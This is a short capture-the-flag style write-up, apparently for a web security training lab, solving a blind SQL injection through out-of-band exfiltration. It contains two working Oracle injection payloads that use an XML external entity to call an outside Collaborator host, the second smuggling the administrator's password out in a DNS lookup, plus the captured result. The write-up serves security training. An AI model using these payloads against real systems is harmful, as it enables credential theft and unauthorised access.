## Lab: Blind SQL injection with out-of-band data exfiltration

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

---

## Notes

1/ Confirm that the parameter is vulnerable via OAST technique

```sql
' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://aiwhf1b7rs2r2hbu6j9hntnm2d88w0kp.oastify.com/"> %remote;]>'),'/l') FROM dual)--
```

2/ Extract the password of the "administrator" user

```sql
' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.aiwhf1b7rs2r2hbu6j9hntnm2d88w0kp.oastify.com/"> %remote;]>'),'/l') FROM dual)--
```

```text
The Collaborator server received a DNS lookup of type A for the domain name 0lgc556mlug0arg8uiik.aiwhf1b7rs2r2hbu6j9hntnm2d88w0kp.oastify.com.
```

```text
0lgc556mlug0arg8uiik
```

